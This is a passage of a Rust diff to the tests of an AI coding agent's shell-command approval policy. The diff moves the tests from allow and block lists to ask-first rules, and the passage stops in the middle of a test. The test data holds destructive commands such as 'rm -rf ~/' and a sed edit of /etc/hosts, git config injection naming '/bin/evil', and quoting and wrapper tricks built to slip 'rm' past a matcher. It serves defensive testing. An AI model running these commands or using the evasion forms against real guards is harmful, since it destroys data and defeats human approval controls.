+            ("git push", "git --no-pager -C repo push"),
+            ("git push", "FOO=1 /usr/bin/git push"),
+            ("git push", "printf x | xargs git push"),
+            ("git push", "if true; then git push; fi"),
+            ("git push", "echo $(git push)"),
+            ("git push", "cat <<EOF\n$(git push)\nEOF"),
+            ("git push", "git -c diff.external=/bin/echo push"),
+            ("git push", "git -C repo -c e=v push"),
+            ("git status", "git --git-dir=.git status --short"),
+            ("git status", "git --git-dir .git status --short"),
+            ("git status", "git status -C repo"),
+            ("git status", "git --config-env core.fsmonitor=FSMON status"),
+            ("git status", "timeout 600 git -C repo status --short"),
+            ("git status", "FOO=bar git -C repo status --short"),
+            ("git -c", "FOO=bar git -c diff.external=/bin/echo diff"),
+            ("rm", "rm -rf /tmp"),
+            ("rm", "timeout 5 rm x"),
+            ("rm", "xargs rm"),
+            ("rm", "find . | xargs rm -f"),
+            ("rm", "find . -exec rm {} +"),
+            ("rm", "find . -name x -execdir rm -f {} \\;"),
+            ("rm", "find . -ok /bin/rm {} ';'"),
+            ("git push", "find . -exec git -C r push \\;"),
+            ("rm", "FOO=bar rm -rf /tmp/x"),
+            ("rm", "/usr/bin/rm -rf x"),
+            ("rm", "./rm x"),
+            ("rm", "FOO=1 /bin/rm x"),
+            ("rm", "ls; ../bin/rm x"),
+            ("rm", "FOO='a b' /usr/bin/rm x"),
+            ("rm", "rm\tx"),
+            ("rm", "/bin/rm\t-rf x"),
+            ("rm", "A=$'\\'' rm x"),
+            ("rm", "FOO=$'a\\' b' /usr/bin/rm x/y"),
+            ("rm", "A+=x A[1 + 1]=y rm x"),
+            ("rm", "timeout 60 rm -rf x"),
+            ("rm", "timeout --signal=KILL 60 rm -rf x"),
+            ("rm", "nice -n 5 rm -rf x"),
+            ("rm", "env FOO=1 rm -rf x"),
+            ("timeout", "timeout 60 cargo build"),
+            ("[", "[ -f /tmp/x ]"),
+        ];
+        for (rule, command) in cases {
+            let rules = asked(&ask_first_config(&[rule]), command)
+                .into_iter()
+                .map(|row| row.rule)
+                .collect::<Vec<_>>();
+            assert!(
+                rules.iter().any(|matched| matched == rule),
+                "`{command}` must ask for `{rule}`, asked for {rules:?}"
+            );
         }
     }
 
     #[test]
-    fn policy_blocks_using_agent_blocklist() {
-        let exec = restricted_execution_config(&[], &["rm"]);
-        let err = enforce_command_policy(&exec, None, "rm -rf /tmp").unwrap_err();
-        assert!(matches!(err, CommandDenial::ExplicitlyBlocked(_)));
-    }
-
-    #[test]
-    fn policy_allows_using_agent_allowlist_even_without_workspace_root() {
-        let exec = restricted_execution_config(&["git status"], &[]);
-        assert!(enforce_command_policy(&exec, None, "git status -s").is_ok());
-    }
-
-    #[test]
-    fn policy_workspace_root_is_not_a_policy_source() {
-        // Legacy `.clai/permissions.json` files are no longer part of command
-        // policy. The root argument is accepted only for the old test wrapper.
-        let temp = tempdir().unwrap();
-        let exec = restricted_execution_config(&["git"], &[]);
-        assert!(enforce_command_policy(&exec, Some(temp.path()), "git status").is_ok());
-    }
-
-    #[test]
-    fn policy_allows_seeded_restricted_prefix_from_allowlist() {
-        let exec = restricted_execution_config(&["rg"], &[]);
-        assert!(enforce_command_policy(&exec, None, "rg --files").is_ok());
-    }
-
-    #[test]
-    fn policy_restricted_prefix_removed_from_allowlist_needs_approval() {
-        let exec = restricted_execution_config(&[], &[]);
-        let err = enforce_command_policy(&exec, None, "rg --files").unwrap_err();
-        assert!(matches!(err, CommandDenial::NotInAllowList(_)));
-    }
-
-    #[test]
-    fn policy_restricted_with_no_matching_allowed_prefix_denies() {
-        let temp = tempdir().unwrap();
-        let exec = restricted_execution_config(&[], &[]);
-        let err = enforce_command_policy(&exec, Some(temp.path()), "obscure-tool").unwrap_err();
-        assert!(matches!(err, CommandDenial::NotInAllowList(_)));
-    }
-
-    // ------------------------------------------------------------------
-    // Per-segment evaluation
-    // ------------------------------------------------------------------
-
-    #[test]
-    fn policy_pipeline_passes_when_all_segments_allowed() {
-        let exec = restricted_execution_config(&["git log", "head", "wc"], &[]);
-        assert!(enforce_command_policy(&exec, None, "git log | head | wc -l").is_ok());
-    }
-
-    #[test]
-    fn policy_pipeline_denies_when_any_segment_unmatched() {
-        // `git log` is allowed, but `obscure-tool` isn't.
-        let exec = restricted_execution_config(&["git log"], &[]);
-        let err = enforce_command_policy(&exec, None, "git log | obscure-tool").unwrap_err();
-        assert!(matches!(err, CommandDenial::NotInAllowList(_)));
-        // Denial should specifically reference the unapproved segment.
-        let msg = err.message();
-        assert!(
-            msg.contains("obscure-tool"),
-            "denial msg should mention the offending segment, got: {msg}"
-        );
-    }
-
-    #[test]
-    fn policy_pipeline_block_in_one_segment_denies_whole() {
-        // Allow git, block rm — the rm segment denies even when git log is fine.
-        let exec = restricted_execution_config(&["git log"], &["rm"]);
-        let err = enforce_command_policy(&exec, None, "git log | rm -rf /tmp/foo").unwrap_err();
-        assert!(matches!(err, CommandDenial::ExplicitlyBlocked(_)));
-    }
-
-    #[test]
-    fn policy_closes_pipe_bypass_foot_gun() {
-        // The motivating bug: pre-segment matcher would word-boundary-match
-        // `git log` as a prefix of the whole pipeline and silently approve
-        // arbitrary downstream commands. Per-segment evaluation now treats
-        // the second segment as its own command — and `rm -rf` (with no
-        // allow entry) denies the pipeline.
-        let exec = restricted_execution_config(&["git log"], &[]);
-        assert!(enforce_command_policy(&exec, None, "git log | rm -rf ~/").is_err());
-    }
-
-    #[test]
-    fn policy_allowlist_never_covers_unparsed_input() {
-        // A quoted command name is not a plain word, so the splitter
-        // leaves it Unparsed. No prefix rule covers it, however broad.
-        let exec = restricted_execution_config(&["touch"], &[]);
-        let command = "\"touch\" PWN";
-        assert_eq!(
-            approval_texts(&exec, command),
-            vec![(command.to_string(), String::new())]
-        );
-        let run_allowed = vec![RunCommandGrant::Prefix(command.to_string())];
-        assert!(matches!(
-            evaluate_command_policy(&exec, command, &run_allowed, &[]),
-            PolicyResult::NeedsApproval(_)
-        ));
-    }
-
-    #[test]
-    fn policy_opaque_segment_in_restricted_denies_when_head_not_allowlisted() {
-        // Negative case: only commands whose head matches the allowlist
-        // pass. The redirect makes this row Opaque, and it gets no free
-        // ride just because `find` is allowlisted.
-        let exec = restricted_execution_config(&["find"], &[]);
-        let err =
-            enforce_command_policy(&exec, None, "bash tools/check-links.sh 2>&1").unwrap_err();
-        assert!(matches!(err, CommandDenial::NotInAllowList(_)));
-    }
-
-    #[test]
-    fn policy_opaque_segment_in_full_mode_passes() {
-        // Full mode skips the allowlist check, so an Opaque redirect row
-        // only fails if it hits a blocklist entry.
-        let exec = ExecutionCapabilityConfig {
-            shell: ShellCapabilityConfig {
-                mode: ShellAccessMode::Full,
-                allowed_command_prefixes: vec![],
-                blocked_command_prefixes: vec![],
-            },
-            ..Default::default()
-        };
-        assert!(enforce_command_policy(&exec, None, "echo hi > f").is_ok());
-    }
-
-    #[test]
-    fn policy_mixed_pipeline_with_opaque_passes_when_all_heads_allowlisted() {
-        // `find . 2>/dev/null` is Opaque (redirect), `wc -l` is Simple.
-        // With both heads on the allowlist the pipeline passes.
-        let exec = restricted_execution_config(&["find", "wc"], &[]);
-        assert!(enforce_command_policy(&exec, None, "find . 2>/dev/null | wc -l").is_ok());
-    }
-
-    #[test]
-    fn policy_mixed_pipeline_denies_when_opaque_head_missing() {
-        // If the Opaque segment's head isn't allowlisted, the pipeline
-        // still hits NeedsApproval — only `find` covered, `xargs` is not.
-        let exec = restricted_execution_config(&["find"], &[]);
-        let err = enforce_command_policy(&exec, None, "find . | xargs rm").unwrap_err();
-        assert!(matches!(err, CommandDenial::NotInAllowList(_)));
-    }
-
-    #[test]
-    fn policy_redirect_segment_in_restricted_allows_when_head_allowlisted() {
-        // `cat /etc/hosts > /tmp/x` — the redirect forces Opaque, but
-        // `cat` is the head and it's on the allowlist. Passes.
-        let exec = restricted_execution_config(&["cat"], &[]);
-        assert!(enforce_command_policy(&exec, None, "cat /etc/hosts > /tmp/x").is_ok());
-    }
-
-    #[test]
-    fn policy_redirect_segment_in_restricted_denies_when_head_not_allowlisted() {
-        let exec = restricted_execution_config(&["ls"], &[]);
-        let err = enforce_command_policy(&exec, None, "cat /etc/hosts > /tmp/x").unwrap_err();
-        assert!(matches!(err, CommandDenial::NotInAllowList(_)));
-    }
-
-    #[test]
-    fn policy_empty_command_still_errors() {
-        let exec = restricted_execution_config(&[], &[]);
-        let err = enforce_command_policy(&exec, None, "   ").unwrap_err();
-        assert!(matches!(err, CommandDenial::ExplicitlyBlocked(_)));
-    }
-
-    // -------------------------------------------------------------------
-    // Run-scoped allowed prefixes — the within-run cache populated by
-    // AllowOnce/AllowAlways so the user isn't re-prompted mid-run.
-    // -------------------------------------------------------------------
-
-    #[test]
-    fn policy_run_scoped_prefix_covers_simple_segment() {
-        // Empty durable allowlist, but a run-scoped entry for `git status`.
-        // A fresh `git status` should pass without approval.
-        let exec = restricted_execution_config(&[], &[]);
-        let run_allowed = vec![RunCommandGrant::Prefix("git status".to_string())];
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git status", &run_allowed, &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_run_scoped_prefix_covers_descendant_args() {
-        // `matches_prefix` accepts the cached prefix plus more arguments,
-        // mirroring durable-allowlist semantics. AllowOnce on `git status`
-        // therefore also covers `git status -s` in the same run.
-        let exec = restricted_execution_config(&[], &[]);
-        let run_allowed = vec![RunCommandGrant::Prefix("git status".to_string())];
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git status -s", &run_allowed, &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_run_scoped_prefix_does_not_cover_different_command() {
-        let exec = restricted_execution_config(&[], &[]);
-        let run_allowed = vec![RunCommandGrant::Prefix("git status".to_string())];
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git add -A", &run_allowed, &[]),
-            PolicyResult::NeedsApproval(_),
-        ));
-    }
-
-    #[test]
-    fn policy_run_scoped_prefix_covers_opaque_segment() {
-        // The run-scoped cache holds the segment text from a prior
-        // AllowOnce — honor it so the user isn't re-prompted for the same
-        // Opaque segment in the same run.
-        let exec = restricted_execution_config(&[], &[]);
-        let command = "find /tmp -name foo 2>/dev/null";
-        let run_allowed = vec![RunCommandGrant::Prefix(command.to_string())];
-        assert!(matches!(
-            evaluate_command_policy(&exec, command, &run_allowed, &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_durable_allowlist_covers_opaque_segment_by_head() {
-        // The durable allowlist matches Opaque segments by their binary
-        // head (via `matches_prefix`), same as it does for Simple. This
-        // lets users persist trust for tools whose syntactic shape
-        // forces Opaque classification (heredocs, redirects, $()) using
-        // the same "Always allow <prefix>" flow as Simple segments.
-        let exec = restricted_execution_config(&["git log"], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git log --oneline > /tmp/log", &[], &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_durable_allowlist_covers_redirect_opaque() {
-        // Real-world case from the friction screenshots: a redirect
-        // (`2>/dev/null`) turns a perfectly safe `which go` into an
-        // Opaque segment. With this fix, allowlisting `which` covers
-        // both `which go` and `which go 2>/dev/null` without re-asking.
-        let exec = restricted_execution_config(&["which"], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "which go 2>/dev/null", &[], &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_durable_allowlist_git_log_covers_no_pager_variant() {
-        // The reported friction: the agent runs `git --no-pager log …`, the
-        // suggester proposes `git log` (stripping the global flag), the user
-        // clicks "Always allow", yet every later `git --no-pager log` was
-        // re-prompted because the literal matcher never reconciled the saved
-        // `git log` with the flagged command. With matcher-side
-        // canonicalization the durable `git log` now covers it.
-        let exec = restricted_execution_config(&["git log"], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git --no-pager log --oneline -2", &[], &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_run_scoped_git_log_covers_no_pager_variant() {
-        // Same agreement must hold for the within-run cache populated by a
-        // fresh AllowAlways/AllowOnce, so the user isn't re-prompted for the
-        // rest of the run after granting once.
-        let exec = restricted_execution_config(&[], &[]);
-        let run_allowed = vec![RunCommandGrant::Prefix("git log".to_string())];
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git --no-pager log --oneline", &run_allowed, &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_blocklist_canonicalization_blocks_env_prefixed_command() {
-        // Canonicalization strengthens the blocklist symmetrically: a blocked
-        // `rm` can't slip through behind an env assignment.
-        let exec = restricted_execution_config(&["git log"], &["rm"]);
-        let err = enforce_command_policy(&exec, None, "FOO=bar rm -rf /tmp/x").unwrap_err();
-        assert!(matches!(err, CommandDenial::ExplicitlyBlocked(_)));
-    }
-
-    #[test]
-    fn policy_blocklist_blocks_a_command_run_by_path() {
-        let exec = restricted_execution_config(&["git log"], &["rm"]);
+    fn ask_first_does_not_fire_for_what_is_not_the_command() {
+        let exec = ask_first_config(&["git push", "rm"]);
         for command in [
-            "/usr/bin/rm -rf x",
-            "./rm x",
-            "FOO=1 /bin/rm x",
-            "ls; ../bin/rm x",
-            "FOO='a b' /usr/bin/rm x",
-            "rm\tx",
-            "/bin/rm\t-rf x",
-            "A=$'\\'' rm x",
-            "FOO=$'a\\' b' /usr/bin/rm x/y",
-            "A+=x A[1 + 1]=y rm x",
+            "echo git push",
+            "git pushes",
+            "git status",
+            "cat <<'EOF'\ngit push\nEOF",
+            "rmdir x",
+            "bash -c \"git push\"",
+            "gh api repos/o/r -X DELETE",
+            "find . -name x",
+            "find . -name rm -print",
+            "find . -exec ls {} +",
         ] {
-            let err = enforce_command_policy(&exec, None, command).unwrap_err();
-            assert!(
-                matches!(err, CommandDenial::ExplicitlyBlocked(_)),
-                "{command}"
-            );
+            assert!(asked(&exec, command).is_empty(), "`{command}` must run");
         }
     }
 
     #[test]
-    fn policy_blocklist_sees_the_command_a_wrapper_runs() {
-        // `timeout` only changes how the command runs, so the blocklist sees
-        // the command itself.
-        let exec = restricted_execution_config(&["git log"], &["rm"]);
+    fn two_matches_in_one_input_give_one_request_with_two_rows() {
+        let exec = ask_first_config(&["git push", "rm"]);
+        assert_eq!(
+            asked(&exec, "rm -f x && cargo test && git push origin main"),
+            vec![
+                AskFirstRow {
+                    text: "rm -f x".to_string(),
+                    rule: "rm".to_string(),
+                },
+                AskFirstRow {
+                    text: "git push origin main".to_string(),
+                    rule: "git push".to_string(),
+                },
+            ]
+        );
+    }
+
+    #[test]
+    fn the_default_list_asks_in_restricted_and_never_in_full() {
+        let mut restricted = ask_first_config(&[]);
+        restricted.shell.ask_first_command_prefixes =
+            crate::config::types::default_ask_first_command_prefixes();
+        let mut full = restricted.clone();
+        full.shell.mode = ShellAccessMode::Full;
         for command in [
-            "timeout 60 rm -rf x",
-            "timeout --signal=KILL 60 rm -rf x",
-            "nice -n 5 rm -rf x",
-            "env FOO=1 rm -rf x",
+            "git push",
+            "cd x && git push",
+            "timeout 5 rm x",
+            "rm -rf x",
+            "printf x | xargs rm",
+            "sudo ls",
+            "cargo publish",
+            "gh api -X DELETE repos/o/r",
         ] {
-            let err = enforce_command_policy(&exec, None, command).unwrap_err();
-            assert!(
-                matches!(err, CommandDenial::ExplicitlyBlocked(_)),
-                "{command}"
-            );
-        }
-    }
-
-    #[test]
-    fn policy_blocklist_sees_the_wrapper_too() {
-        let exec = restricted_execution_config(&["git log"], &["timeout"]);
-        let err = enforce_command_policy(&exec, None, "timeout 60 cargo build").unwrap_err();
-        assert!(matches!(err, CommandDenial::ExplicitlyBlocked(_)));
-    }
-
-    #[test]
-    fn policy_suggests_the_command_a_wrapper_runs() {
-        // The row the user approves is the whole wrapper, but the prefix it
-        // offers is the command inside it, so the grant is specific and
-        // covers the row it came from.
-        let exec = restricted_execution_config(&[], &[]);
-        let rows = approval_texts(&exec, "timeout 600 cargo build 2>&1 | tail -20");
-        assert_eq!(
-            rows,
-            vec![
-                (
-                    "timeout 600 cargo build 2>&1".to_string(),
-                    "cargo build".to_string()
-                ),
-                ("tail -20".to_string(), "tail".to_string()),
-            ]
-        );
-        // The saved prefix covers the row it came from.
-        let exec = restricted_execution_config(&["cargo build"], &[]);
-        assert!(enforce_command_policy(&exec, None, "timeout 600 cargo build 2>&1").is_ok());
-    }
-
-    #[test]
-    fn policy_allowlist_matches_the_command_bash_runs() {
-        // Bash reads `$'\''` as one quoted `'`, so this runs `rm`.
-        let exec = restricted_execution_config(&["git status"], &[]);
-        let command = "A=$'\\'' rm -rf x ' git status '";
-        assert!(matches!(
-            evaluate_command_policy(&exec, command, &[], &[]),
-            PolicyResult::NeedsApproval(_)
-        ));
-    }
-
-    #[test]
-    fn policy_opaque_segment_suggests_prefix_when_unmatched() {
-        // When an Opaque segment isn't allowlisted, the approval payload
-        // now carries a non-empty `suggested_prefix` so the FE can
-        // surface an "Always allow <prefix>" button — the affordance that
-        // makes the user's trust persistable. Previously this was empty
-        // and only "Allow once" was offered for Opaque rows.
-        let exec = restricted_execution_config(&[], &[]);
-        let result = evaluate_command_policy(&exec, "find /tmp -name foo 2>/dev/null", &[], &[]);
-        let PolicyResult::NeedsApproval(approvals) = result else {
-            panic!("expected NeedsApproval, got {:?}", policy_label(&result));
-        };
-        assert_eq!(approvals.len(), 1);
-        assert!(approvals[0].kind == crate::commands::permissions::SegmentKind::Opaque);
-        assert_eq!(approvals[0].suggested_prefix, "find");
-    }
-
-    #[test]
-    fn policy_asks_for_every_command_even_when_prefixes_repeat() {
-        // A user's decision on a row applies to exactly the command it shows,
-        // so a second command with the same head must get its own row.
-        let exec = restricted_execution_config(&[], &[]);
-        assert_eq!(
-            approval_texts(&exec, "rm a.txt; rm -rf ~/x"),
-            vec![
-                ("rm a.txt".to_string(), "rm".to_string()),
-                ("rm -rf ~/x".to_string(), "rm".to_string()),
-            ]
-        );
-        assert_eq!(
-            approval_texts(&exec, "sed -i 's/a/b/' f1 && sed -i '1d' /etc/hosts"),
-            vec![
-                ("sed -i 's/a/b/' f1".to_string(), "sed".to_string()),
-                ("sed -i '1d' /etc/hosts".to_string(), "sed".to_string()),
-            ]
-        );
-    }
-
-    #[test]
-    fn git_dash_c_forms_cannot_escape_a_broad_block() {
-        // `git -C <dir> status` is `git status` run elsewhere; a broad
-        // `git status` block must catch it even while `git` at large is
-        // allowed. Before option-aware normalization the matcher read the
-        // directory as the subcommand (`git repo status`) and the block
-        // never fired.
-        let exec = restricted_execution_config(&["git"], &["git status"]);
-        for cmd in [
-            "git -C repo status --short",
-            "git --git-dir=.git status --short",
-            "git --git-dir .git status --short",
-            "git --no-pager -C repo status",
-            "git status -C repo",
-        ] {
+            assert!(asks_first(&restricted, command), "`{command}` must ask");
             assert!(
                 matches!(
-                    evaluate_command_policy(&exec, cmd, &[], &[]),
-                    PolicyResult::Block { .. }
-                ),
-                "`{cmd}` must be blocked by `git status`"
-            );
-        }
-    }
-
-    #[test]
-    fn git_dash_c_block_applies_in_full_mode_and_behind_wrappers() {
-        // The blocklist is mode-independent, and neither a wrapper nor an
-        // env prefix may interpose itself between `git status` and its
-        // block.
-        let exec = full_execution_config(&["git status"]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git -C repo status --short", &[], &[]),
-            PolicyResult::Block { .. }
-        ));
-        let exec = restricted_execution_config(&[], &["git status"]);
-        for cmd in [
-            "timeout 600 git -C repo status --short",
-            "FOO=bar git -C repo status --short",
-        ] {
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, cmd, &[], &[]),
-                    PolicyResult::Block { .. }
-                ),
-                "`{cmd}` must be blocked by `git status`"
-            );
-        }
-    }
-
-    #[test]
-    fn git_status_allowlist_covers_dash_c_forms_without_widening() {
-        let exec = restricted_execution_config(&["git status"], &[]);
-        // The saved prefix matches the commands it was suggested for…
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git -C repo status --short", &[], &[]),
-            PolicyResult::Allow
-        ));
-        // …and nothing more: another subcommand behind -C stays uncovered.
-        assert!(matches!(
-            evaluate_command_policy(&exec, "git -C repo push", &[], &[]),
-            PolicyResult::NeedsApproval(_)
-        ));
-    }
-
-    #[test]
-    fn git_suggested_prefix_round_trips_through_saved_allow() {
-        let exec = restricted_execution_config(&[], &[]);
-        for (command, expected) in [
-            ("git -C repo status --short", "git status"),
-            ("git --git-dir=.git log --oneline", "git log"),
-            ("git --no-pager show HEAD", "git show"),
-        ] {
-            let rows = approval_texts(&exec, command);
-            assert_eq!(rows, vec![(command.to_string(), expected.to_string())]);
-            let saved = restricted_execution_config(&[&rows[0].1], &[]);
-            assert!(
-                matches!(
-                    evaluate_command_policy(&saved, command, &[], &[]),
+                    evaluate_command_policy(&full, command, &[]),
                     PolicyResult::Allow
                 ),
-                "saved suggestion must authorize its own command: `{command}`"
+                "`{command}` must run without a card in Full"
             );
+        }
+        // A former Restricted agent runs everyday commands without a card.
+        for command in ["cargo test", "ls -la", "git status", "touch x && cat x"] {
+            assert!(!asks_first(&restricted, command), "`{command}` must run");
         }
     }
 
     #[test]
-    fn git_config_injection_has_no_persistent_subcommand_suggestion() {
-        let exec = restricted_execution_config(&["git show", "git status", "git log"], &[]);
-        for command in [
-            "git -c core.pager=less show HEAD",
-            "git --config-env core.fsmonitor=FSMON status",
-            "git --config-env=core.fsmonitor=FSMON status",
-            "git -C repo -c core.pager=less log --oneline",
-            "git --no-pager --config-env=core.fsmonitor=FSMON status",
-            "FOO=bar git -c core.pager=less show HEAD",
-            "timeout 600 git --config-env=core.fsmonitor=FSMON status",
-        ] {
-            assert_eq!(
-                approval_texts(&exec, command),
-                vec![(command.to_string(), String::new())],
-                "config-carrying command must require approval without offering a saved subcommand rule"
-            );
-        }
-    }
-
-    #[test]
-    fn git_config_injection_cannot_ride_a_saved_allow() {
-        // `-c` and `--config-env` inject configuration into the run, and
-        // configuration can name commands to execute (core.fsmonitor,
-        // diff.external). Normalization must not strip them for allow
-        // matching: `git -c diff.external=/bin/echo diff …` would
-        // otherwise run /bin/echo under a saved `git diff` — the same
-        // value-word skipping that fixed `-C` opened this gap, so
-        // config-carrying invocations stay outside every saved
-        // subcommand prefix and ask for approval on their own.
-        let exec = restricted_execution_config(&["git diff", "git status", "git log"], &[]);
-        for cmd in [
-            "git -c diff.external=/bin/echo diff HEAD~1 HEAD",
-            "git -c core.fsmonitor=/bin/evil status",
-            "git --config-env core.fsmonitor=FSMON status",
-            "git --config-env=core.fsmonitor=FSMON status",
-            "git -C repo -c core.pager=/bin/evil log --oneline",
-        ] {
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, cmd, &[], &[]),
-                    PolicyResult::NeedsApproval(_)
-                ),
-                "`{cmd}` must need approval despite the saved allow"
-            );
-        }
-    }
-
-    #[test]
-    fn git_config_injection_still_meets_blocks() {
-        // Deny matching reads through every documented global option, so a
-        // block keeps catching the subcommand however the run is
-        // configured — and a deny aimed at the config form itself fires
-        // too, even behind an env prefix the literal match cannot see
-        // through.
-        let exec = restricted_execution_config(&["git"], &["git push", "git status"]);
-        for cmd in [
-            "git -c diff.external=/bin/echo push",
-            "git --config-env core.fsmonitor=FSMON status",
-            "git -C repo -c e=v push",
-        ] {
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, cmd, &[], &[]),
-                    PolicyResult::Block { .. }
-                ),
-                "`{cmd}` must be blocked"
-            );
-        }
-        let exec = restricted_execution_config(&[], &["git -c"]);
-        assert!(matches!(
-            evaluate_command_policy(
-                &exec,
-                "FOO=bar git -c diff.external=/bin/echo diff",
-                &[],
-                &[]
+    fn the_default_list_asks_for_common_spellings_of_its_commands() {
+        let mut exec = ask_first_config(&[]);
+        exec.shell.ask_first_command_prefixes =
+            crate::config::types::default_ask_first_command_prefixes();
+        for (command, rule) in [
+            ("kubectl -n ns delete pod x", "kubectl delete"),
+            ("kubectl --context prod delete pod x", "kubectl delete"),
+            ("kubectl --namespace=ns delete pod x", "kubectl delete"),
+            (
+                "kubectl --certificate-authority ca.crt delete pod x",
+                "kubectl delete",
             ),
-            PolicyResult::Block { .. }
-        ));
+            ("kubectl --profile cpu delete pod x", "kubectl delete"),
+            ("docker --context x push img", "docker push"),
+            ("docker -H tcp://x push img", "docker push"),
+            ("docker image push img", "docker image push"),
+            ("docker --context x image push img", "docker image push"),
+            ("npm --prefix x publish", "npm publish"),
+            ("npm -w pkg publish", "npm publish"),
+            ("npm --tag beta publish", "npm publish"),
+            ("npm --otp 123456 publish", "npm publish"),
+            ("npm --access public publish", "npm publish"),
+            ("npm -L project publish", "npm publish"),
+            ("npm --location project publish", "npm publish"),
+            ("npm --scope @o --auth-type web publish", "npm publish"),
+            ("cargo +nightly publish", "cargo publish"),
+            ("cargo -Z unstable publish", "cargo publish"),
+            ("pnpm --filter x publish", "pnpm publish"),
+            ("pnpm -C dir publish", "pnpm publish"),
+            ("yarn npm publish", "yarn npm publish"),
+            ("gh -R o/r release create v1", "gh release"),
+            ("gh --repo o/r release delete v1", "gh release"),
+            ("gh api -X DELETE repos/o/r", "gh api -X DELETE"),
+            ("gh api -XDELETE repos/o/r", "gh api -X DELETE"),
+            ("gh api --method DELETE repos/o/r", "gh api -X DELETE"),
+            ("gh api --method=DELETE repos/o/r", "gh api -X DELETE"),
+            ("gh api -X=DELETE repos/o/r", "gh api -X DELETE"),
+            ("timeout 5 gh api --method DELETE x", "gh api -X DELETE"),
+            (
+                "gh api repos/o/r/git/refs/heads/x -X DELETE",
+                "gh api -X DELETE",
+            ),
+            (
+                "env -S \"gh api --method DELETE repos/o/r\"",
+                "gh api -X DELETE",
+            ),
+            (
+                "find . -exec gh api --method DELETE {} \\;",
+                "gh api -X DELETE",
+            ),
+        ] {
+            let rules: Vec<String> = asked(&exec, command)
+                .into_iter()
+                .map(|row| row.rule)
+                .collect();
+            assert_eq!(rules, [rule], "`{command}`");
+        }
+        for command in [
+            "kubectl -n ns get pods",
+            "kubectl --context prod get pods",
+            "docker --context x ps",
+            "docker image ls",
+            "npm --prefix x run build",
+            "cargo +nightly build",
+            "pnpm --filter x test",
+            "yarn npm info x",
+            "gh -R o/r pr view 1",
+            "gh api repos/o/r",
+            "gh api -X GET repos/o/r",
+        ] {
+            assert!(!asks_first(&exec, command), "`{command}` must run");
+        }
     }
 
     #[test]
-    fn git_dash_c_suggestion_is_the_subcommand_not_the_value() {
+    fn a_row_lists_every_rule_it_matches() {
+        let exec = ask_first_config(&["git push", "rm", " git ", "git push"]);
+        let rules: Vec<String> = asked(&exec, "git push origin")
+            .into_iter()
+            .map(|row| row.rule)
+            .collect();
+        assert_eq!(rules, ["git push", "git"]);
+        // With every listed rule removed, the row runs: none is left to ask.
+        assert!(matches!(
+            evaluate_command_policy(&exec, "git push origin", &rules),
+            PolicyResult::Allow
+        ));
+        assert!(asks_first(&exec, "git status"), "`git` still asks");
+    }
+
+    #[test]
+    fn always_allow_stops_the_rules_asking_for_the_rest_of_this_run_only() {
+        let workspace = tempdir().unwrap();
+        let run = context_with_grants(workspace.path(), Vec::new());
+        let other_run = context_with_grants(workspace.path(), Vec::new());
+        let exec = ask_first_config(&["git push", "git"]);
+        let command = "git push origin main";
+        let asks_in = |context: &ToolExecutionContext| {
+            matches!(
+                evaluate_command_policy(&exec, command, &context.run_removed_ask_first_snapshot()),
+                PolicyResult::AskFirst(_)
+            )
+        };
+        let PolicyResult::AskFirst(rows) = evaluate_command_policy(&exec, command, &[]) else {
+            panic!("`{command}` must ask");
+        };
+        let rules = vec!["git push".to_string(), "git".to_string()];
+
+        apply_ask_first_decision(&run, &rows, &rules, AskFirstDecision::AllowOnce)
+            .expect("Allow once runs the command");
+        assert!(asks_in(&run), "Allow once keeps the rules");
+
+        apply_ask_first_decision(&run, &rows, &rules, AskFirstDecision::AlwaysAllow)
+            .expect("Always allow runs the command");
+        assert!(!asks_in(&run), "the same run asks no more");
+        assert!(asks_in(&other_run), "another run keeps its own snapshot");
+
+        let denied = apply_ask_first_decision(
+            &other_run,
+            &rows,
+            &rules,
+            AskFirstDecision::Deny {
+                reason: Some("no".to_string()),
+            },
+        );
+        assert_eq!(denied, Err(ask_first_denied_message(&rows, Some("no"))));
+        assert!(other_run.had_warnings() && !run.had_warnings());
+    }
+
+    #[test]
+    fn a_rule_removed_in_this_run_no_longer_asks() {
+        let exec = ask_first_config(&["git push", "rm"]);
+        let removed = vec!["git push".to_string()];
+        assert!(matches!(
+            evaluate_command_policy(&exec, "git push origin main", &removed),
+            PolicyResult::Allow
+        ));
+        // Only the removed rule: another rule still asks.
+        let PolicyResult::AskFirst(rows) =
+            evaluate_command_policy(&exec, "git push && rm -f x", &removed)
+        else {
+            panic!("rm must still ask");
+        };
+        assert_eq!(rows.len(), 1);
+        assert_eq!(rows[0].rule, "rm");
+    }
+
+    #[test]
+    fn an_empty_ask_first_list_asks_nothing() {
+        let exec = ask_first_config(&[]);
+        assert!(!asks_first(&exec, "git push && rm -rf x"));
+    }
+
+    #[test]
+    fn denied_message_names_each_row_its_rule_and_the_reason() {
+        let rows = vec![
+            AskFirstRow {
+                text: "rm -f x".to_string(),
+                rule: "rm".to_string(),
+            },
+            AskFirstRow {
+                text: "git push".to_string(),
+                rule: "git push".to_string(),
+            },
+        ];
         assert_eq!(
-            crate::assistant::tools::prefix_detector::suggest_prefix("git -C repo status --short"),
-            "git status"
+            ask_first_denied_message(&rows, Some("  keep x  ")),
+            "User denied `rm -f x` (ask-first rule `rm`), `git push` (ask-first rule `git push`). \
+             Reason: keep x."
+        );
+        assert_eq!(
+            ask_first_denied_message(&rows[..1], Some(" ")),
+            "User denied `rm -f x` (ask-first rule `rm`)."
+        );
+        assert_eq!(
